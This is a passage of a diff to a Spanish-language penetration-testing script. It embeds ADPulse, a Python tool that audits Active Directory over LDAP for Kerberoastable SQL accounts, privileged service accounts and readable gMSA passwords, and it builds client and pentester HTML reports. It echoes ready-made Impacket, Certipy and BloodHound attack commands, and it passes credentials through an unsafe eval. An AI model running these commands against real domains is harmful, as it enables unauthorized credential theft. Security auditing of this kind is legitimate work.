+            attributes=['cn','msDS-MinimumPasswordLength','msDS-LockoutThreshold',
+                        'msDS-PasswordSettingsPrecedence'])
+        if conn.entries:
+            psos = []
+            for pso in conn.entries:
+                min_len = str(pso['msDS-MinimumPasswordLength'] or '?')
+                lockout = str(pso['msDS-LockoutThreshold'] or '?')
+                psos.append(f"{pso.cn}: minLen={min_len}, lockout={lockout}")
+            finding("INFO", "Fine-Grained Policy",
+                f"{len(psos)} PSO(s) — Verificar que no debiliten la política global",
+                psos,
+                "Auditar PSOs. Un PSO mal configurado puede tener contraseñas más débiles que la política del dominio.",
+                0.0)
+        else:
+            print(f"  {D}[i]{W} Sin Fine-Grained Password Policies detectadas.")
+    except Exception as e:
+        if "No such object" in str(e):
+            print(f"  {D}[i]{W} Sin PSOs configurados en este dominio.")
+        else:
+            print(f"  {Y}[?]{W} {e}")
+
+def check_32_ous_delegation(conn, base_dn, ldap3):
+    """CHECK 32: Delegaciones en OUs — posibles paths de escalación"""
+    section("CHECK 32 — OU Delegations (GenericAll / GenericWrite)")
+    try:
+        conn.search(base_dn, '(objectClass=organizationalUnit)',
+                    attributes=['distinguishedName','ou'],
+                    controls=[('1.2.840.113556.1.4.801', True, None)])
+        if conn.entries:
+            ou_count = len(conn.entries)
+            print(f"  {C}[+]{W} {ou_count} OUs encontradas — Para análisis completo usar BloodHound")
+            finding("INFO", "OU Delegations",
+                f"{ou_count} OUs detectadas — Analizar ACLs con BloodHound",
+                [f"OUs encontradas: {ou_count}",
+                 "BloodHound: Edges GenericAll, GenericWrite, WriteDACL, WriteOwner sobre OUs son críticos.",
+                 "PowerView: Get-DomainObjectAcl -SearchBase 'OU=...' -ResolveGUIDs"],
+                "Auditar delegaciones en OUs. Eliminar permisos excesivos. Usar BloodHound para visualizar paths de ataque.",
+                0.0, ["https://bloodhound.readthedocs.io/"])
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_33_mssql_spns(conn, base_dn, ldap3):
+    """CHECK 33: SQL Server SPNs — objetivo frecuente de Kerberoasting"""
+    section("CHECK 33 — SQL Server SPNs (MSSQLSvc)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(servicePrincipalName=MSSQLSvc/*))',
+            attributes=['sAMAccountName','servicePrincipalName','memberOf'])
+        if conn.entries:
+            sql_accounts = []
+            for e in conn.entries:
+                spns = list(e.servicePrincipalName.values) if hasattr(e.servicePrincipalName,'values') else [e.servicePrincipalName]
+                is_admin = any('admin' in str(m).lower() for m in (e.memberOf.values if hasattr(e.memberOf,'values') else []))
+                admin_flag = " 🚨 ADMIN GROUP!" if is_admin else ""
+                sql_accounts.append(f"{e.sAMAccountName}: {str(spns[0])}{admin_flag}")
+            finding("ALTO", "MSSQL Kerberoasting",
+                f"SQL Server SPNs: {len(sql_accounts)} cuenta(s) — Alto valor para Kerberoasting",
+                sql_accounts,
+                "Usar MSA/gMSA para servicios SQL. Contraseñas de 25+ caracteres. SQL service accounts NO deben ser Domain Admin.",
+                8.0, ["https://attack.mitre.org/techniques/T1558/003/"])
+        else:
+            print(f"  {D}[i]{W} Sin SQL Server SPNs detectados.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_34_privileged_service_accounts(conn, base_dn, ldap3):
+    """CHECK 34: Cuentas de servicio con privilegios altos"""
+    section("CHECK 34 — Service Accounts con Membresía Privilegiada")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))',
+            attributes=['sAMAccountName','memberOf'])
+        high_priv_svc = []
+        priv_keywords = ['domain admin', 'enterprise admin', 'schema admin', 'administrator', 'backup operator']
+        for e in conn.entries:
+            groups = list(e.memberOf.values) if hasattr(e.memberOf,'values') else [str(e.memberOf or '')]
+            is_priv = any(any(kw in str(g).lower() for kw in priv_keywords) for g in groups)
+            if is_priv:
+                grp_names = [re.search(r'CN=([^,]+)', str(g)).group(1) for g in groups[:2] if re.search(r'CN=([^,]+)', str(g))]
+                high_priv_svc.append(f"{e.sAMAccountName} → grupos: {', '.join(grp_names)}")
+
+        if high_priv_svc:
+            finding("CRÍTICO", "Privileged Service Accounts",
+                f"{len(high_priv_svc)} Cuenta(s) de Servicio con Privilegios de Admin",
+                high_priv_svc,
+                "Cuentas de servicio NO deben ser Domain Admin. Usar principio de mínimo privilegio. Migrar a gMSA.",
+                9.0)
+        else:
+            print(f"  {G}[OK]{W} Sin service accounts con grupos privilegiados detectados.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_35_goldengmsa(conn, base_dn, ldap3):
+    """CHECK 35: gMSA — Golden gMSA attack (msDS-ManagedPassword readable)"""
+    section("CHECK 35 — gMSA Security (Golden gMSA)")
+    try:
+        conn.search(base_dn,
+            '(objectClass=msDS-GroupManagedServiceAccount)',
+            attributes=['sAMAccountName','msDS-ManagedPassword','msDS-ManagedPasswordID',
+                        'msDS-GroupMSAMembership'])
+        if conn.entries:
+            gmsa_exposed = []
+            for e in conn.entries:
+                pwd = str(e['msDS-ManagedPassword'] or '')
+                if pwd and pwd != '[]' and len(pwd) > 5:
+                    gmsa_exposed.append(f"{e.sAMAccountName}: msDS-ManagedPassword LEGIBLE ← CRÍTICO!")
+                else:
+                    gmsa_exposed.append(f"{e.sAMAccountName}: gMSA presente (password protegido)")
+
+            if any("LEGIBLE" in g for g in gmsa_exposed):
+                finding("CRÍTICO", "Golden gMSA",
+                    f"gMSA Password EXPUESTO para usuario actual",
+                    [g for g in gmsa_exposed if "LEGIBLE" in g],
+                    "Restringir msDS-ManagedPassword ACL. Solo los hosts autorizados (msDS-GroupMSAMembership) deben poder leer.",
+                    9.5, ["https://improsec.com/tech-blog/o83i5pjygrqjn7ei3oknf7fek4dxdbn5"])
+            else:
+                print(f"  {G}[OK]{W} {len(conn.entries)} gMSA(s) encontradas — passwords no accesibles con este usuario.")
+                finding("INFO", "gMSA Inventory",
+                    f"{len(conn.entries)} Group Managed Service Account(s) detectada(s)",
+                    [g for g in gmsa_exposed],
+                    "Verificar con: Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership",
+                    0.0)
+        else:
+            print(f"  {D}[i]{W} Sin gMSAs configuradas en este dominio.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+# ─────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='ADPulse — AD Security Auditor')
+    parser.add_argument('--dc',     required=True, help='IP/hostname del Domain Controller')
+    parser.add_argument('--base',   required=True, help='Base DN (ej: DC=corp,DC=local)')
+    parser.add_argument('--user',   default='',    help='Usuario (ej: CORP\\\\jsmith o jsmith@corp.local)')
+    parser.add_argument('--pass',   default='',    dest='password', help='Contraseña')
+    parser.add_argument('--hash',   default='',    help='Hash NTLM (Pass-the-Hash)')
+    parser.add_argument('--output', default='',    help='Archivo JSON de salida')
+    parser.add_argument('--checks', default='all', help='Checks a ejecutar (all o 01,03,05)')
+    args = parser.parse_args()
+
+    print(f"\n  {'═'*60}")
+    print(f"  {B}{BOLD}ADPulse — Active Directory Security Auditor{W}")
+    print(f"  {D}35 checks | LDAP read-only | Integrado en WriestTavo v8.0{W}")
+    print(f"  {'═'*60}")
+    print(f"  DC     : {Y}{args.dc}{W}")
+    print(f"  Base DN: {Y}{args.base}{W}")
+    print(f"  Usuario: {G}{args.user or 'Anónimo'}{W}")
+    print(f"  Modo   : {C}{'Pass-the-Hash' if args.hash else 'Contraseña' if args.password else 'Anonymous/Null'}{W}")
+    print()
+
+    # Conectar
+    conn, ldap3 = connect_ldap(args.dc, args.base, args.user or None,
+                                args.password or None, args.hash or None)
+    if not conn:
+        print(f"  {R}[ERROR]{W} No se pudo conectar al DC {args.dc}:389")
+        print(f"  Verificar: conectividad, credenciales y que LDAP esté habilitado.")
+        sys.exit(1)
+
+    auth_type = "Anónimo" if not args.user else ("PtH" if args.hash else "Autenticado")
+    print(f"  {G}[+]{W} Conectado como {B}{auth_type}{W} a {args.dc}\n")
+
+    # Ejecutar los 35 checks
+    checks = [
+        check_01_null_session,         # 01
+        check_02_password_policy,      # 02
+        check_03_kerberoastable,        # 03
+        check_04_asrep_roasting,        # 04
+        check_05_adcs_vulnerabilities,  # 05
+        check_06_unconstrained_delegation, # 06
+        check_07_constrained_delegation,   # 07
+        check_08_rbcd,                     # 08
+        check_09_laps,                     # 09
+        check_10_domain_admins,            # 10
+        check_11_inactive_accounts,        # 11
+        check_12_password_not_required,    # 12
+        check_13_password_never_expires,   # 13
+        check_14_admin_count,              # 14
+        check_15_dcsync_rights,            # 15
+        check_16_machine_account_quota,    # 16
+        check_17_guest_account,            # 17
+        check_18_gpo_analysis,             # 18
+        check_19_trusts,                   # 19
+        check_20_recycle_bin,              # 20
+        check_21_spooler_service,          # 21
+        check_22_krbtgt_password_age,      # 22
+        check_23_protected_users,          # 23
+        check_24_dns_admins,               # 24
+        check_25_backup_operators,         # 25
+        check_26_exchange_permissions,     # 26
+        check_27_ldap_signing,             # 27
+        check_28_rodc_krbtgt,              # 28
+        check_29_shadow_credentials,       # 29
+        check_30_gpo_scripts,              # 30
+        check_31_fine_grained_policy,      # 31
+        check_32_ous_delegation,           # 32
+        check_33_mssql_spns,               # 33
+        check_34_privileged_service_accounts, # 34
+        check_35_goldengmsa,               # 35
+    ]
+
+    selected = list(range(len(checks)))
+    if args.checks != 'all':
+        selected = [int(c)-1 for c in args.checks.split(',') if c.strip().isdigit()]
+
+    for idx in selected:
+        if 0 <= idx < len(checks):
+            try:
+                checks[idx](conn, args.base, ldap3)
+            except Exception as ex:
+                print(f"  {Y}[!]{W} Check {idx+1:02d} error: {ex}")
+
+    # ── Resumen final ─────────────────────────────────────────
+    print(f"\n  {'═'*60}")
+    print(f"  {BOLD}RESUMEN ADPulse{W}")
+    print(f"  {'═'*60}")
+    total = sum(stats.values())
+    print(f"  {R}{BOLD}💀 CRÍTICO: {stats['CRÍTICO']}{W}   {R}🔴 ALTO: {stats['ALTO']}{W}   {Y}🟡 MEDIO: {stats['MEDIO']}{W}   {G}🟢 BAJO: {stats['BAJO']}{W}   {B}ℹ️  INFO: {stats['INFO']}{W}")
+    print(f"  Total hallazgos: {total} en {len(selected)} checks ejecutados")
+
+    if args.output:
+        with open(args.output, 'w') as f:
+            json.dump({"domain": args.base, "dc": args.dc, "user": args.user,
+                       "timestamp": datetime.now(timezone.utc).isoformat(),
+                       "stats": dict(stats), "findings": findings}, f, indent=2, default=str)
+        print(f"\n  Resultados guardados: {args.output}")
+
+    print()
+    conn.unbind()
+PYAD
+
+    # ── Ejecutar ADPulse ──────────────────────────────────────────
+    ok "ADPulse Python script creado en: ${adpulse_py}"
+    echo
+
+    # Construir argumentos
+    local py_args="--dc ${INTEL_AD_DC} --base \"${ldap_base}\" --output ${adpulse_json}"
+    [[ -n "$ad_user" ]]  && py_args+=" --user \"${ad_user}\""
+    [[ -n "$ad_pass" ]]  && py_args+=" --pass \"${ad_pass}\""
+    [[ -n "$ad_hash" ]]  && py_args+=" --hash \"${ad_hash}\""
+
+    cmd_show "python3 ${adpulse_py} ${py_args}"
+    eval "python3 '${adpulse_py}' ${py_args}" 2>/dev/null | tee "${OUTPUT_DIR}/recon/adpulse_output.txt"
+
+    # ── Parsear JSON y agregar hallazgos al reporte HTML ─────────
+    if [[ -f "$adpulse_json" ]]; then
+        ok "ADPulse: resultados guardados en ${adpulse_json}"
+
+        # Leer resultados y crear hallazgo HTML compuesto
+        python3 - << PYADREPORT
+import json, sys
+
+try:
+    with open("${adpulse_json}") as f:
+        data = json.load(f)
+
+    findings = data.get("findings", [])
+    stats    = data.get("stats", {})
+
+    # Construir HTML para el reporte de WriestTavo
+    html = f"""
+<div style='background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:12px;'>
+  <div style='display:flex;gap:16px;flex-wrap:wrap;margin-bottom:12px;'>
+    <span style='background:#ff2d2d22;border:1px solid #ff2d2d;padding:4px 12px;border-radius:4px;color:#ff2d2d;font-weight:bold;'>💀 Crítico: {stats.get('CRÍTICO',0)}</span>
+    <span style='background:#ff6b3522;border:1px solid #ff6b35;padding:4px 12px;border-radius:4px;color:#ff6b35;font-weight:bold;'>🔴 Alto: {stats.get('ALTO',0)}</span>
+    <span style='background:#ffd23f22;border:1px solid #ffd23f;padding:4px 12px;border-radius:4px;color:#ffd23f;font-weight:bold;'>🟡 Medio: {stats.get('MEDIO',0)}</span>
+    <span style='background:#57cc9922;border:1px solid #57cc99;padding:4px 12px;border-radius:4px;color:#57cc99;'>🟢 Bajo: {stats.get('BAJO',0)}</span>
+    <span style='background:#58a6ff22;border:1px solid #58a6ff;padding:4px 12px;border-radius:4px;color:#58a6ff;'>ℹ️ Info: {stats.get('INFO',0)}</span>
+  </div>
+  <small style='color:#8b949e;'>DC: {data.get('dc','')} | Dominio: {data.get('domain','')} | Usuario: {data.get('user','Anónimo')} | {data.get('timestamp','')[:19].replace('T',' ')}</small>
+</div>"""
+
+    sev_colors = {"CRÍTICO":"#ff2d2d","ALTO":"#ff6b35","MEDIO":"#ffd23f","BAJO":"#57cc99","INFO":"#58a6ff"}
+    sev_bg     = {"CRÍTICO":"#1a0a0a","ALTO":"#1a0f0a","MEDIO":"#1a180a","BAJO":"#0a1a0a","INFO":"#0a0f1a"}
+
+    for f in findings:
+        sev   = f.get("severity","INFO")
+        color = sev_colors.get(sev,"#8b949e")
+        bg    = sev_bg.get(sev,"#161b22")
+        cvss  = f.get("cvss",0)
+        refs  = f.get("refs",[])
+
+        detail_html = "".join(f"<li style='margin:3px 0;'>{d}</li>" for d in f.get("detail",[])[:8])
+        refs_html   = " ".join(f"<a href='{r}' target='_blank' style='font-size:11px;color:#58a6ff;margin-right:8px;'>{r[:60]}...</a>" for r in refs[:2])
+
+        html += f"""
+<div style='background:{bg};border-left:4px solid {color};padding:12px;margin-bottom:8px;border-radius:0 6px 6px 0;'>
+  <div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;'>
+    <span style='color:{color};font-weight:bold;font-size:13px;'>[{sev}] {f.get('title','')}</span>
+    {'<span style=\'background:#ff2d2d;color:#fff;padding:2px 8px;border-radius:4px;font-size:12px;font-weight:bold;\'>CVSS '+str(cvss)+'</span>' if cvss >= 7 else ''}
+    <span style='color:#484f58;font-size:11px;'>{f.get('category','')}</span>
+  </div>
+  <ul style='margin:0 0 8px 16px;color:#c9d1d9;font-size:12px;'>{detail_html}</ul>
+  <div style='background:#0d1117;padding:8px;border-radius:4px;font-size:11px;'>
+    <span style='color:#3fb950;'>🔧 Remediar:</span> <span style='color:#8b949e;'>{f.get('remediation','')[:200]}</span>
+  </div>
+  {'<div style="margin-top:6px;">' + refs_html + '</div>' if refs_html else ''}
+</div>"""
+
+    print("ADPULSE_HTML_START")
+    print(html)
+    print("ADPULSE_HTML_END")
+    total = sum(stats.values())
+    crit  = stats.get('CRÍTICO',0)
+    alto  = stats.get('ALTO',0)
+    print(f"ADPULSE_STATS:{total}:{crit}:{alto}")
+except Exception as e:
+    print(f"Error parsing ADPulse results: {e}", file=sys.stderr)
+PYADREPORT
+    fi
+
+    # ── Parsear output y agregar hallazgo principal al reporte ───
+    local ad_html ad_total ad_crit ad_alto
+    if [[ -f "$adpulse_json" ]]; then
+        ad_html=$(python3 "${adpulse_py%adpulse_audit.py}adpulse_html_tmp.py" 2>/dev/null || \
+                  sed -n '/ADPULSE_HTML_START/,/ADPULSE_HTML_END/p' "${OUTPUT_DIR}/recon/adpulse_output.txt" | \
+                  grep -v "ADPULSE_HTML_")
+        local stats_line
+        stats_line=$(grep "ADPULSE_STATS:" "${OUTPUT_DIR}/recon/adpulse_output.txt" 2>/dev/null | tail -1)
+        ad_total=$(echo "$stats_line" | cut -d: -f2)
+        ad_crit=$(echo "$stats_line"  | cut -d: -f3)
+        ad_alto=$(echo "$stats_line"  | cut -d: -f4)
+
+        local ad_sev="INFO"
+        [[ "${ad_crit:-0}" -gt 0 ]] && ad_sev="CRÍTICO"
+        [[ "${ad_crit:-0}" -eq 0 && "${ad_alto:-0}" -gt 0 ]] && ad_sev="ALTO"
+
+        add_finding "$ad_sev" \
+            "ADPulse — Active Directory: ${ad_total:-0} hallazgos (${ad_crit:-0} críticos, ${ad_alto:-0} altos)" \
+            "${ad_html:-<p>Ver ${OUTPUT_DIR}/recon/adpulse_output.txt para detalles completos.</p>}" \
+            "$(python3 -c "import json; d=json.load(open('${adpulse_json}')); cvss=[f['cvss'] for f in d.get('findings',[]) if f.get('cvss',0)>0]; print(round(max(cvss),1) if cvss else 0)" 2>/dev/null || echo "8.5")" \
+            "Ver remedaciones por check en el reporte. Priorizar: ADCS ESC1 > Kerberoasting > DCSync > Unconstrained Delegation." \
+            "BloodHound para análisis visual | Certify.exe /vulnerable para ADCS | Rubeus kerberoast para validar | Impacket GetUserSPNs.py"
+
+        intel_log "ADPulse: ${ad_total:-0} hallazgos AD en ${INTEL_AD_DOMAIN}"
+        INTEL_AD_KERBEROASTABLE+=("Ver ${OUTPUT_DIR}/recon/adpulse_output.txt")
+    fi
+
+    # ── Sugerir siguiente paso con credenciales ───────────────────
+    echo
+    echo -e "  ${C_BLU}── Siguiente paso recomendado según hallazgos: ──${C_RST}"
+    echo -e "  ${C_YEL}Kerberoasting:${C_RST}   impacket-GetUserSPNs '${INTEL_AD_DOMAIN}/${ad_user}:PASS' -dc-ip ${INTEL_AD_DC} -request"
+    echo -e "  ${C_YEL}AS-REP Roast:${C_RST}    impacket-GetNPUsers '${INTEL_AD_DOMAIN}/' -usersfile users.txt -dc-ip ${INTEL_AD_DC} -no-pass"
+    echo -e "  ${C_YEL}Bloodhound:${C_RST}      bloodhound-python -d '${INTEL_AD_DOMAIN}' -u '${ad_user}' -p 'PASS' -dc ${INTEL_AD_DC} -c all"
+    echo -e "  ${C_YEL}ADCS:${C_RST}            certipy find -u '${ad_user}@${INTEL_AD_DOMAIN}' -p 'PASS' -dc-ip ${INTEL_AD_DC} -vulnerable"
+    echo -e "  ${C_YEL}LDAP dump:${C_RST}       ldapdomaindump -u '${INTEL_AD_DOMAIN}\\\\${ad_user}' -p 'PASS' ldap://${INTEL_AD_DC}"
+    echo
+}
+
+
+
+# ════════════════════════════════════════════════════════════════
+# SISTEMA DE 3 REPORTES ESPECIALIZADOS
+# Reporte 1: Cliente IT   — Ejecutivo + Payloads aplicables
+# Reporte 2: Censurado    — Privacidad / Legal / Compliance
+# Reporte 3: Pentester    — Técnico completo + rutas de ataque
+# ════════════════════════════════════════════════════════════════
+
+# Variables de tracking de evidencia
+EFFECTIVE_PAYLOADS=()   # "tipo|payload|url|evidencia"
+ATTACK_ROUTES=()        # "ruta de ataque encadenada"
+REPORT_CLIENT=""        # path reporte cliente
+REPORT_CENSORED=""      # path reporte censurado
+REPORT_PENTESTER=""     # path reporte pentester
+
+# ── Registrar payload efectivo (llamar desde módulos) ───────────
+register_payload() {
+    # register_payload TIPO PAYLOAD URL EVIDENCIA
+    EFFECTIVE_PAYLOADS+=("${1}|||${2}|||${3}|||${4}")
+}
+
+# ── Registrar ruta de ataque ─────────────────────────────────────
+register_attack_route() {
+    ATTACK_ROUTES+=("$1")
+}
+
+# ════════════════════════════════════════════════════════════════
+# REPORTE 1: CLIENTE IT
+# ════════════════════════════════════════════════════════════════
+generar_reporte_cliente() {
+    log "Generando Reporte 1: Cliente IT..."
+    local ts
+    ts=$(date +"%Y%m%d_%H%M%S")
+    REPORT_CLIENT="${OUTPUT_DIR}/reporte_CLIENTE_${TARGET//[^a-zA-Z0-9]/_}_${ts}.html"
+
+    # Conteos
+    local crit=0 alto=0 med=0 bajo=0 info_c=0
+    local total_cvss=0 cvss_n=0
+    for f in "${FINDINGS[@]}"; do
+        local sev; sev=$(echo "$f" | awk -F'|||' '{print $1}')
+        case "$sev" in
+            CRÍTICO) ((crit++)) ;;
+            ALTO)    ((alto++)) ;;
+            MEDIO)   ((med++)) ;;
+            BAJO)    ((bajo++)) ;;
+            *)       ((info_c++)) ;;
+        esac
+        local cv; cv=$(echo "$f" | awk -F'|||' '{print $4}' | grep -oE '^[0-9]+\.?[0-9]*' | head -1)
+        [[ -n "$cv" ]] && total_cvss=$(python3 -c "print(${total_cvss}+${cv})" 2>/dev/null || echo "$total_cvss") && ((cvss_n++))
+    done
+    local avg_cvss="N/A"
+    (( cvss_n > 0 )) && avg_cvss=$(python3 -c "print(round(${total_cvss}/${cvss_n},1))" 2>/dev/null || echo "N/A")
+
+    # Nivel de riesgo global
+    local risk_level="BAJO" risk_color="#57cc99" risk_icon="🟢"
+    (( crit > 0 )) && risk_level="CRÍTICO" && risk_color="#ff2d2d" && risk_icon="🔴"
+    (( crit == 0 && alto > 0 )) && risk_level="ALTO" && risk_color="#ff6b35" && risk_icon="🟠"
+    (( crit == 0 && alto == 0 && med > 0 )) && risk_level="MEDIO" && risk_color="#ffd23f" && risk_icon="🟡"
+
+    # Payloads confirmados por categoría
+    local payload_sqli="" payload_xss="" payload_lfi="" payload_ssrf=""
+    for ep in "${EFFECTIVE_PAYLOADS[@]}"; do
+        local ep_tipo ep_payload ep_url ep_ev
+        ep_tipo=$(echo "$ep"    | awk -F'|||' '{print $1}')
+        ep_payload=$(echo "$ep" | awk -F'|||' '{print $2}')
+        ep_url=$(echo "$ep"     | awk -F'|||' '{print $3}')
+        ep_ev=$(echo "$ep"      | awk -F'|||' '{print $4}')
+        case "${ep_tipo,,}" in
+            sqli|sql*)
+                payload_sqli+="<tr><td><code class='payload-tag'>${ep_payload}</code></td>"
+                payload_sqli+="<td class='url-col'>${ep_url}</td>"
+                payload_sqli+="<td>${ep_ev}</td></tr>"
+                ;;
+            xss*)
+                payload_xss+="<tr><td><code class='payload-tag xss'>${ep_payload}</code></td>"
+                payload_xss+="<td class='url-col'>${ep_url}</td>"
+                payload_xss+="<td>${ep_ev}</td></tr>"
+                ;;
+            lfi*)
+                payload_lfi+="<tr><td><code class='payload-tag lfi'>${ep_payload}</code></td>"
+                payload_lfi+="<td class='url-col'>${ep_url}</td>"
+                payload_lfi+="<td>${ep_ev}</td></tr>"
+                ;;
+            ssrf*)
+                payload_ssrf+="<tr><td><code class='payload-tag ssrf'>${ep_payload}</code></td>"
+                payload_ssrf+="<td class='url-col'>${ep_url}</td>"
+                payload_ssrf+="<td>${ep_ev}</td></tr>"
+                ;;
+        esac
+    done
+
+    # Construir sección de hallazgos para cliente (sin comandos técnicos de explotación)
+    local findings_html=""
+    for finding in "${FINDINGS[@]}"; do
+        local sev title detail cvss rem
+        sev=$(echo    "$finding" | awk -F'|||' '{print $1}')
+        title=$(echo  "$finding" | awk -F'|||' '{print $2}')
+        detail=$(echo "$finding" | awk -F'|||' '{print $3}')
+        cvss=$(echo   "$finding" | awk -F'|||' '{print $4}')
+        rem=$(echo    "$finding" | awk -F'|||' '{print $5}')
+
+        [[ "$sev" == "INFO" ]] && continue   # cliente no ve INFO
+
+        local color="#5bc0de"
+        case "$sev" in
+            CRÍTICO) color="#ff2d2d" ;;
+            ALTO)    color="#ff6b35" ;;
+            MEDIO)   color="#ffd23f" ;;
+            BAJO)    color="#57cc99" ;;
+        esac
+
+        # Traducir severidad a impacto de negocio
+        local biz_impact=""
+        case "$sev" in
+            CRÍTICO) biz_impact="Acceso no autorizado o robo de datos críticos es posible <b>hoy mismo</b>. Requiere acción <u>inmediata</u>." ;;
+            ALTO)    biz_impact="Riesgo significativo de compromiso. Corregir en el <b>próximo sprint</b>." ;;
+            MEDIO)   biz_impact="Vulnerabilidad que podría ser explotada en combinación con otras. Corregir en <b>30 días</b>." ;;
+            BAJO)    biz_impact="Exposición de información o configuración subóptima. Incluir en <b>backlog</b>." ;;
+        esac
+
+        # Indicar si hubo payload confirmado para este hallazgo
+        local payload_badge=""
+        if echo "${title,,}" | grep -qE "sql injection|sqli"; then
+            [[ -n "$payload_sqli" ]] && payload_badge="<span class='payload-confirmed'>✓ INYECCIÓN CONFIRMADA</span>"
+        elif echo "${title,,}" | grep -qE "xss|cross.site"; then
+            [[ -n "$payload_xss" ]] && payload_badge="<span class='payload-confirmed'>✓ PAYLOAD XSS ACTIVO</span>"
+        elif echo "${title,,}" | grep -qE "lfi|path traversal|local file"; then
+            [[ -n "$payload_lfi" ]] && payload_badge="<span class='payload-confirmed'>✓ ACCESO A ARCHIVOS CONFIRMADO</span>"
+        elif echo "${title,,}" | grep -qE "ssrf|server.side request"; then
+            [[ -n "$payload_ssrf" ]] && payload_badge="<span class='payload-confirmed'>✓ ACCESO INTERNO CONFIRMADO</span>"
+        fi
+
+        findings_html+="<div class='finding-card' style='border-left:4px solid ${color};'>"
+        findings_html+="<div class='card-header'>"
+        findings_html+="<span class='sev-badge' style='background:${color};'>${sev}</span>"
+        [[ -n "$cvss" && "$cvss" != "N/A" ]] && findings_html+="<span class='cvss-pill'>CVSS ${cvss}</span>"
+        findings_html+="<span class='card-title'>${title}</span>"
+        findings_html+="${payload_badge}"
+        findings_html+="</div>"
+        findings_html+="<div class='card-body'>"
+        # Strip comandos técnicos del detail para cliente
+        local clean_detail
+        clean_detail=$(echo "$detail" | sed 's|<div class=['\''"]nextstep.*</div>||g' \
+            | sed 's|<code>[^<]*</code>||g' \
+            | sed 's|<pre>[^<]*</pre>||g' 2>/dev/null || echo "$detail")
+        findings_html+="<div class='biz-impact'><b>💼 Impacto de negocio:</b> ${biz_impact}</div>"
+        findings_html+="<div class='tech-summary'>${clean_detail:0:400}</div>"
+        findings_html+="<div class='remediation-block'><b>✅ Cómo solucionarlo:</b><br>${rem}</div>"
+        findings_html+="</div></div>"
+    done
+
+    # Construir tabla de payloads confirmados
+    local payloads_section=""
+    if (( ${#EFFECTIVE_PAYLOADS[@]} > 0 )); then
+        payloads_section="<section class='payloads-section'>"
+        payloads_section+="<h2>⚠ Inyecciones y Técnicas Confirmadas</h2>"
+        payloads_section+="<p class='section-desc'>Las siguientes técnicas de ataque fueron <b>verificadas exitosamente</b> durante la auditoría. Representan rutas de acceso reales que un atacante podría utilizar.</p>"
+
+        [[ -n "$payload_sqli" ]] && payloads_section+="
+        <h3>💉 SQL Injection Confirmado</h3>
+        <table class='payload-table'>
+        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
+        <tbody>${payload_sqli}</tbody></table>"
+
+        [[ -n "$payload_xss" ]] && payloads_section+="
+        <h3>🔗 Cross-Site Scripting (XSS) Confirmado</h3>
+        <table class='payload-table'>
+        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
+        <tbody>${payload_xss}</tbody></table>"
+
+        [[ -n "$payload_lfi" ]] && payloads_section+="
+        <h3>📂 Lectura de Archivos (LFI) Confirmada</h3>
+        <table class='payload-table'>
+        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
+        <tbody>${payload_lfi}</tbody></table>"
+
+        [[ -n "$payload_ssrf" ]] && payloads_section+="
+        <h3>🌐 SSRF / Acceso Interno Confirmado</h3>
+        <table class='payload-table'>
+        <thead><tr><th>Payload Aplicable</th><th>URL Afectada</th><th>Evidencia</th></tr></thead>
+        <tbody>${payload_ssrf}</tbody></table>"
+
+        payloads_section+="</section>"
+    fi
+
+    cat > "$REPORT_CLIENT" << CLIENTHTML
+<!DOCTYPE html><html lang="es"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Informe de Seguridad — ${TARGET} — Cliente IT</title>
+<style>
+  :root{--bg:#f8f9fa;--bg2:#ffffff;--txt:#2c3e50;--txt2:#5a6877;--border:#e0e6ed;
+        --accent:#2563eb;--red:#dc2626;--orange:#ea580c;--yellow:#d97706;--green:#16a34a;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--txt);line-height:1.6;}
+  .header{background:linear-gradient(135deg,#1e3a8a 0%,#2563eb 50%,#0ea5e9 100%);
+          color:#fff;padding:40px 48px;position:relative;overflow:hidden;}
+  .header::before{content:'';position:absolute;top:-40px;right:-40px;width:200px;height:200px;
+                  background:rgba(255,255,255,.05);border-radius:50%;}
+  .header-logo{font-size:11px;letter-spacing:3px;text-transform:uppercase;
+               opacity:.7;margin-bottom:8px;}
+  .header h1{font-size:28px;font-weight:700;margin-bottom:6px;}
+  .header-meta{display:flex;gap:24px;margin-top:16px;font-size:13px;opacity:.85;}
+  .header-meta span{display:flex;align-items:center;gap:6px;}
+  .container{max-width:1100px;margin:0 auto;padding:32px 24px;}
+  /* Risk Banner */
+  .risk-banner{background:var(--bg2);border:2px solid ${risk_color};border-radius:12px;
+               padding:24px 32px;margin-bottom:32px;display:flex;align-items:center;gap:24px;}
+  .risk-icon{font-size:48px;}
+  .risk-title{font-size:22px;font-weight:700;color:${risk_color};}
+  .risk-desc{color:var(--txt2);font-size:15px;margin-top:4px;}
+  /* Stats */
+  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+              gap:16px;margin-bottom:32px;}
+  .stat-card{background:var(--bg2);border-radius:10px;padding:20px;text-align:center;
+             box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid var(--border);}
+  .stat-num{font-size:36px;font-weight:800;line-height:1;}
+  .stat-label{font-size:12px;color:var(--txt2);text-transform:uppercase;
+              letter-spacing:1px;margin-top:6px;}
+  .stat-crit .stat-num{color:var(--red);}
+  .stat-high .stat-num{color:var(--orange);}
+  .stat-med  .stat-num{color:var(--yellow);}
+  .stat-low  .stat-num{color:var(--green);}
+  .stat-cvss .stat-num{color:var(--accent);}
+  /* Section */
